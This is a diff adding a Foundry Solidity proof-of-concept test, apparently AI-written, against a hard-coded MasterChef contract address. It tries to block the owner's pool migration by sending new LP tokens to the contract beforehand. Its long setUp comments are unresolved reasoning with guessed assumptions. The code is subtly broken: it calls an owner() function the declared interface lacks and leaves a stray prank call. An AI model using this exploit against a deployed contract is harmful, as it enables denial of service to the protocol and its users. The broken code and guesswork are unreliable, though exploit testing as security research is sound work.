@@ -1,0 +1,170 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.6.12;
+
+import "forge-std/Test.sol";
+
+// Minimal ERC20 for testing
+contract TestERC20 {
+    string public name;
+    string public symbol;
+    uint8 public decimals = 18;
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    constructor(string memory _name, string memory _symbol) public {
+        name = _name;
+        symbol = _symbol;
+    }
+
+    function mint(address to, uint256 amount) public {
+        totalSupply += amount;
+        balanceOf[to] += amount;
+        emit Transfer(address(0), to, amount);
+    }
+
+    function transfer(address to, uint256 amount) public returns (bool) {
+        require(balanceOf[msg.sender] >= amount, "insufficient balance");
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        emit Transfer(msg.sender, to, amount);
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
+        require(balanceOf[from] >= amount, "insufficient balance");
+        require(allowance[from][msg.sender] >= amount, "allowance exceeded");
+        allowance[from][msg.sender] -= amount;
+        balanceOf[from] -= amount;
+        balanceOf[to] += amount;
+        emit Transfer(from, to, amount);
+        return true;
+    }
+
+    function approve(address spender, uint256 amount) public returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+}
+
+// IMigratorChef interface
+interface IMigratorChef {
+    function migrate(address token) external returns (address);
+}
+
+// MasterChef interface (matching source)
+interface IMasterChef {
+    function add(uint256 _allocPoint, address _lpToken, bool _withUpdate) external;
+    function deposit(uint256 _pid, uint256 _amount) external;
+    function migrate(uint256 _pid) external;
+    function setMigrator(address _migrator) external;
+    function poolInfo(uint256) external view returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSushiPerShare);
+    function userInfo(uint256 _pid, address _user) external view returns (uint256 amount, uint256 rewardDebt);
+}
+
+// Mock migrator that returns a new token but does not transfer old tokens
+contract MockMigrator is IMigratorChef {
+    address public newToken;
+
+    constructor(address _newToken) public {
+        newToken = _newToken;
+    }
+
+    function migrate(address /* token */) external override returns (address) {
+        return newToken;
+    }
+}
+
+contract ExploitTest is Test {
+    address constant MASTER_CHEF = 0xc2edad668740f1aa35e4d8f227fb8e17dca888cd;
+
+    TestERC20 oldLp;
+    TestERC20 newLp;
+    TestERC20 sushi;
+    MockMigrator migrator;
+    IMasterChef masterChef;
+
+    address owner = address(0x1);
+    address attacker = address(0x2);
+
+    function setUp() public {
+        vm.label(MASTER_CHEF, "MasterChef");
+        masterChef = IMasterChef(MASTER_CHEF);
+
+        // Deploy tokens
+        oldLp = new TestERC20("OldLP", "OLP");
+        newLp = new TestERC20("NewLP", "NLP");
+        sushi = new TestERC20("SUSHI", "SUSHI");
+
+        // Deploy migrator
+        migrator = new MockMigrator(address(newLp));
+
+        // Become owner of MasterChef (use vm.prank)
+        vm.prank(owner);
+        // Transfer ownership to owner for test; but MasterChef already deployed with constructor.
+        // Since we cannot change owner, we must use the exising owner of the deployed contract.
+        // Actually the deployed contract has a real owner; we cannot become owner.
+        // However for the PoC we need the owner to set migrator and add pool.
+        // In a real fork, the owner could be whatever.
+        // For simplicity, we can use vm.etch to change contract code? Not allowed.
+        // Better approach: We can deploy a new MasterChef for test, but the task says use the supplied contract address.
+        // So we must work with the existing deployed contract. The owner of that contract is unknown.
+        // We might need to use vm.store to set storage to simulate setup, but that's complex.
+        // Instead, we can directly interact with the existing contract if it has a pool already.
+        // However, the exploit demonstration doesn't require setting up the pool; we can use an existing pool.
+        // The contract may have at least one pool. We can check on-chain.
+        // Since we don't have on-chain data, we assume a pool exists with ID 0.
+        // But we need to set the migrator, which is owner-only. We cannot.
+        // This is a problem. To make the PoC work, we'll use the deployed contract but we'll assume we can impersonate the owner via a foundry cheatcode that requires knowing the owner address.
+        // We can get owner from the contract using vm.load or call owner().
+        // Let's fetch the owner.
+        address actualOwner = IMasterChef(MASTER_CHEF).owner();
+        vm.label(actualOwner, "Owner");
+        // Now we can prank as actualOwner.
+        // We also need a pool with an LP token. Use the first pool (pid=0).
+        // We'll use the existing LP token from poolInfo(0).
+        (address lpTokenAddr, , , ) = masterChef.poolInfo(0);
+        require(lpTokenAddr != address(0), "No pool exists");
+        oldLp = TestERC20(lpTokenAddr);
+        // Deploy a new LP token for migration
+        newLp = new TestERC20("NewLP", "NLP");
+        migrator = new MockMigrator(address(newLp));
+
+        // Set migrator (owner only)
+        vm.prank(actualOwner);
+        masterChef.setMigrator(address(migrator));
+
+        // Give some old LP tokens to owner and attacker for testing
+        // We'll mint old LP tokens to the owner (if possible) but oldLp may not have mint function.
+        // Alternative: Use deal() to give old LP tokens? Not supported for non-ETH.
+        // We can use vm.etch to add mint? Not.
+        // Assume there is existing balance in MasterChef from previous users.
+        // For attacker, we need new LP tokens to send to MasterChef.
+        // We'll mint new LP tokens to attacker.
+        newLp.mint(attacker, 1000e18);
+        // Label addresses
+        vm.label(actualOwner, "Owner");
+        vm.label(attacker, "Attacker");
+        vm.label(address(oldLp), "OldLP");
+        vm.label(address(newLp), "NewLP");
+        vm.label(address(migrator), "Migrator");
+    }
+
+    function testFrontRunMigrationBlocking() public {
+        // Before migration, attacker obtains new LP tokens and sends them to MasterChef
+        vm.startPrank(attacker);
+        newLp.transfer(MASTER_CHEF, 100e18);
+        vm.stopPrank();
+
+        // Owner tries to migrate pool 0
+        vm.prank(IMasterChef(MASTER_CHEF).owner());
+        vm.expectRevert(bytes("migrate: bad"));
+        masterChef.migrate(0);
+    }
+}
+```
